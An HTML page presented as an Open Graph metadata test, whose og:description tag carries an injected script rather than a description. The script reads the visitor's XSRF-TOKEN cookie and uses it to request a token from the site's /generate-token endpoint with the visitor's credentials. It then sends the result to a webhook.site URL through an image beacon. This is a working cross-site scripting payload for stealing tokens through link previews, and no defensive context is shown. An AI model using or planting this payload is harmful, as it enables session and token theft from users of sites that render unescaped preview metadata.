<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>My OG Test</title>
  <meta property="og:title" content="My Test Page" />
  <meta property="og:description" content='<script>
    (async function () {
      const webhook = "https://webhook.site/160659b7-11cf-4cba-8f2b-6d8646022db3";
  
      function getXsrf() {
        try {
          return decodeURIComponent(
            document.cookie
              .split("; ")
              .find(c => c.startsWith("XSRF-TOKEN="))
              .split("=")[1]
          );
        } catch {
          return null;
        }
      }
  
      const token = getXsrf();
      if (!token) return;
  
      try {
        const res1 = await fetch("/generate-token", {
          method: "POST",
          headers: {
            "X-XSRF-TOKEN": token,
            "X-Requested-With": "XMLHttpRequest"
          },
          credentials: "include"
        });
  
        const json = await res1.json();
  
        // Gửi toàn bộ json tới webhook
        new Image().src = webhook + "?data=" + encodeURIComponent(JSON.stringify(json));
      } catch (e) {
        new Image().src = webhook + "?error=" + encodeURIComponent(e.message);
      }
    })();
  </script>' /> 
  <meta property="og:image" content="https://example.com/image.jpg" />
  <meta property="og:url" content="https://username.github.io/repo-name/" />
</head>
<body>
  <h1>Hello Open Graph</h1>
</body>
</html>
